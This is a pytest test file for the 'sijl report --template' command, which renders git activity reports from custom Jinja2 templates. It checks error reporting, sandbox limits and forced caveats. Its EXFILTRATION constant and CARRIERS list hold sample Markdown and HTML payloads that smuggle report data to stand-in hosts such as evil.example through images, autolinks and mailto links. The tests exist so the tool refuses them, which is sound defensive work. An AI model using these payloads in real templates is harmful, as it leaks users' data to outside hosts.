"""`sijl report --template FILE`: your own Jinja2 template renders the report — it can
include the built-in sections — and anything wrong with it is a usage error (exit 2) naming the
template and the line, found before any repository is read when it can be. A template that leaves
out the Caveats or the footer gets both added, and the command says so."""

from pathlib import Path

import pytest
from typer.testing import CliRunner

from sijl.cli import app
from tests.gitfactory import ME, PERIOD_ARGS

runner = CliRunner()
FOOTER = "*These figures are evidence of activity, not a performance score.*"


def report(tmp_path: Path, template: str, *extra: str, encoding: str = "utf-8"):
    path = tmp_path / "mine.md.j2"
    path.write_bytes(template.encode(encoding))
    args = ["report", "--root", str(tmp_path / "repos"), "--author-email", ME.email, *PERIOD_ARGS]
    return runner.invoke(app, [*args, "--template", str(path), *extra]), path


def two_commits(make_repo) -> None:
    repo = make_repo("repos/app")
    repo.commit("feat: shipped it", at="2026-05-04T10:00:00+02:00")
    repo.commit("fix: a [link](javascript:x) | pipe", at="2026-05-05T10:00:00+02:00")


MINE = """\
# {{ person }}: {{ totals.commits|plural("commit") }} in {{ period.described }}

{% for repo in repositories %}
- {{ repo.name }}: {{ repo.commits }} ({{ repo.share }})
{% for commit in repo.rows %}
  - {{ commit.date }} {{ commit.subject|shorten(20) }}
{% endfor %}
{% endfor %}

{% include "caveats.md.j2" %}
{% include "footer.md.j2" %}
"""


def test_a_custom_template_renders_the_report(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    result, _ = report(tmp_path, MINE)
    assert result.exit_code == 0, result.output
    assert result.stdout.startswith(
        f"# {ME.name}: 2 commits in 1 April 2026 to 30 June 2026\n\n"
        "- app: 2 (100%)\n"
        "  - 2026-05-05 fix: a \\[link\\](javas…\n"  # cut to 20 first, then made inert
        "  - 2026-05-04 feat: shipped it\n"
        "\n## Caveats\n"
    )
    assert result.stdout.endswith(f"---\n\n{FOOTER}\n")
    assert result.stderr == ""  # nothing added: the template printed the Caveats and the footer


def test_the_template_is_written_to_out_too(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    target = tmp_path / "review.md"
    result, _ = report(tmp_path, MINE, "--out", str(target))
    assert result.exit_code == 0, result.output
    assert result.stdout == "" and target.read_text().startswith(f"# {ME.name}: 2 commits")


def test_a_misspelt_field_is_a_usage_error_naming_the_template_and_line(make_repo, tmp_path):
    two_commits(make_repo)
    result, path = report(tmp_path, "# Report\n\n{{ totals.comits }}\n")
    assert result.exit_code == 2
    assert result.stdout == ""
    assert f"sijl: template {path}, line 3: 'comits' is not a field here" in result.stderr
    assert "did you mean 'commits'?" in result.stderr


def test_a_syntax_error_fails_before_any_repository_is_read(tmp_path) -> None:
    # No repository exists at all: the template is checked first, so this is exit 2, not 3.
    result, path = report(tmp_path, "line one\n{% for x in %}\n")
    assert result.exit_code == 2
    assert result.stderr.startswith(f"sijl: template {path}, line 2: ")


def test_a_construct_that_captures_output_is_refused_with_its_line(tmp_path) -> None:
    result, path = report(tmp_path, "a\nb\n{% set s %}{{ person }}{% endset %}{{ s }}\n")
    assert result.exit_code == 2
    assert f"template {path}, line 3: {{% set %}} … {{% endset %}} is not available" in (
        result.stderr
    )


def test_an_operation_the_sandbox_refuses_is_a_usage_error(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    result, path = report(tmp_path, "{{ person.upper() }}\n")
    assert result.exit_code == 2 and f"template {path}, line 1: " in result.stderr


def test_a_template_that_cannot_be_read_is_a_usage_error(tmp_path) -> None:
    missing = tmp_path / "nowhere.md.j2"
    args = ["report", "--root", str(tmp_path), "--author-email", ME.email, *PERIOD_ARGS]
    result = runner.invoke(app, [*args, "--template", str(missing)])
    assert result.exit_code == 2
    assert f"sijl: template {missing}: it cannot be read" in result.stderr
    latin, _ = report(tmp_path, "caf\xe9 {{ person }}\n", encoding="latin-1")
    assert latin.exit_code == 2 and "it is not UTF-8 text" in latin.stderr


def test_an_unknown_include_is_named(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    result, path = report(tmp_path, "x\n{% include 'secrets.md.j2' %}\n")
    assert result.exit_code == 2
    assert f"template {path}, line 2: there is no built-in template named 'secrets.md.j2'" in (
        result.stderr
    )


def test_sijl_always_ends_a_custom_report_with_its_caveats_and_footer(make_repo, tmp_path):
    """A template could hide the Caveats in an HTML comment, so a custom
    template never prints them at all — Sijl adds its own Caveats and footer after every
    custom report, and the built-in caveats and footer sections print nothing when included."""
    two_commits(make_repo)
    for source in ("# Only numbers: {{ totals.commits }}\n",
                   '# Only numbers: {{ totals.commits }}\n{% include "caveats.md.j2" %}\n'
                   '{% include "footer.md.j2" %}\n'):  # fmt: skip
        result, _ = report(tmp_path, source)
        assert result.exit_code == 0, result.output
        text = result.stdout
        assert text.startswith("# Only numbers: 2\n\n## Caveats\n\n- Commits are counted by author")
        assert text.count("## Caveats") == 1 and text.endswith(f"---\n\n{FOOTER}\n")
        assert result.stderr == ""


def test_a_template_cannot_print_move_or_hide_the_caveats(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    for source in (
        "{{ caveats[0] }}\n",
        "<!--\n{% for line in caveats %}{{ line }}\n{% endfor %}{{ footer }}\n-->\n",
        "{{ footer }}\n",
    ):
        result, path = report(tmp_path, source)
        assert result.exit_code == 2, source
        assert f"template {path}, line " in result.stderr
        assert "Sijl adds the Caveats and the footer after every custom template" in (result.stderr)


EXFILTRATION = (
    "{% for repo in repositories %}{% for commit in repo.rows %}"
    "![](<https://stats.example/p.png?r={{ repo.name }}&s={{ commit.subject }}>)"
    "{% endfor %}{% endfor %}\n"
)


def test_a_template_that_links_or_loads_anything_sijl_did_not_build_is_refused(
    make_repo, tmp_path
) -> None:
    """A downloaded template could put the report's data into an image
    address, which a Markdown viewer loads on its own. After rendering a custom template, every
    link, image, autolink and piece of HTML in its output is checked: only the forge links
    Sijl built may stand; anything else is a usage error and nothing is written."""
    two_commits(make_repo)
    target = tmp_path / "review.md"
    for source in (
        EXFILTRATION,
        "[intranet](https://intranet.example/x)\n",
        "<https://stats.example/{{ repositories[0].name }}>\n",
        "<!-- {{ person }} -->\n",
        "a <img src=x> b\n",
    ):
        result, path = report(tmp_path, source, "--out", str(target))
        assert result.exit_code == 2, source
        assert f"sijl: template {path}, line " in result.stderr, result.stderr
        assert "that Sijl did not build" in result.stderr
        assert "--allow-template-links" in result.stderr
        assert not target.exists()


def test_allow_template_links_lets_a_trusted_template_link_anywhere(make_repo, tmp_path) -> None:
    two_commits(make_repo)
    result, _ = report(tmp_path, "[intranet](https://intranet.example/x)\n",
                       "--allow-template-links")  # fmt: skip
    assert result.exit_code == 0, result.output
    assert result.stdout.startswith("[intranet](https://intranet.example/x)\n")


def test_sijl_s_own_links_may_stand_in_a_custom_template(make_repo, tmp_path) -> None:
    repo = make_repo("repos/app")
    repo.commit("feat: shipped it", at="2026-05-04T10:00:00+02:00")
    repo.publish(tmp_path / "remotes" / "app.git", "main")
    repo.git("remote", "set-url", "origin", "git@gitlab.com:acme/app.git")
    result, _ = report(
        tmp_path, "{% for r in repositories %}{{ r.projects|join(' ') }} "
        "{% for c in r.rows %}{{ c.commit }}{% endfor %}{% endfor %}\n",
    )  # fmt: skip
    assert result.exit_code == 0, result.output
    assert "[gitlab.com/acme/app](https://gitlab.com/acme/app)" in result.stdout
    assert "](https://gitlab.com/acme/app/-/commit/" in result.stdout


def test_a_template_that_runs_too_long_grows_too_large_or_is_too_big_is_refused(
    make_repo, tmp_path, monkeypatch
) -> None:
    """A custom template has a time limit, an output limit and a size
    limit, each a usage error naming the template — never a hang or a full disk."""
    two_commits(make_repo)
    monkeypatch.setattr("sijl.render.markdown.TEMPLATE_SECONDS", 0.5)
    nested = "".join("{% for a in kinds.kinds %}" for _ in range(8)) + "{% endfor %}" * 8
    slow, path = report(tmp_path, nested + "\n")
    assert slow.exit_code == 2 and f"template {path}: it ran longer than 0.5 s" in slow.stderr
    monkeypatch.setattr("sijl.render.markdown.MAX_OUTPUT_CHARS", 1_000)
    loud, path = report(tmp_path, "{% for a in kinds.kinds %}{{ '-' * 999 }}{% endfor %}\n")
    assert loud.exit_code == 2 and "its output passed 1,000 characters" in loud.stderr
    monkeypatch.setattr("sijl.render.markdown.MAX_TEMPLATE_CHARS", 100)
    big, path = report(tmp_path, "x" * 101)
    assert big.exit_code == 2 and f"template {path}: it is larger than 100 characters" in (
        big.stderr
    )


# The report is pasted into GitHub or GitLab, which render GFM: bare addresses become links there
# even where a CommonMark parser sees text. Every form a template could use to carry data out —
# each must be refused (a parser differential: what one renderer shows as text, another links).
CARRIERS = [
    "see https://stats.example/p?d={{ repositories[0].name }}",
    "www.evil.example/x?d={{ repositories[0].name }}",
    "evil.example/collect?d={{ repositories[0].name }}",
    "{{ repositories[0].name }}@evil.example",
    "<{{ repositories[0].name }}@evil.example>",
    "mailto:{{ repositories[0].name }}@evil.example",
    "//evil.example/{{ repositories[0].name }}",
    "![x][1]\n\n[1]: https://evil.example/{{ repositories[0].name }}.png",
    "[x][1]\n\n[1]: <https://evil.example/{{ repositories[0].name }}>",
    "| a |\n|---|\n| ![a](https://evil.example/{{ repositories[0].name }}.png) |",
    "<!-- {{ person }} -->",
    "<details><summary>{{ person }}</summary></details>",
    '<a href="https://evil.example/{{ repositories[0].name }}">x</a>',
    "<img src=x>",
    "https://evil.\nexample/?d={{ repositories[0].name }}",
    "`https://evil.example/?d={{ repositories[0].name }}`",  # in a code span: refused too
    "[a]({{ repositories[0].rows[0].subject }})",
]


@pytest.mark.parametrize("source", CARRIERS)
def test_every_way_of_carrying_data_to_an_address_is_refused(make_repo, tmp_path, source) -> None:
    two_commits(make_repo)
    result, path = report(tmp_path, f"# Report\n\n{source}\n")
    assert result.exit_code == 2, result.stdout
    assert f"sijl: template {path}, line " in result.stderr, result.stderr
    assert "that Sijl did not build" in result.stderr and "--allow-template-links" in (
        result.stderr
    )
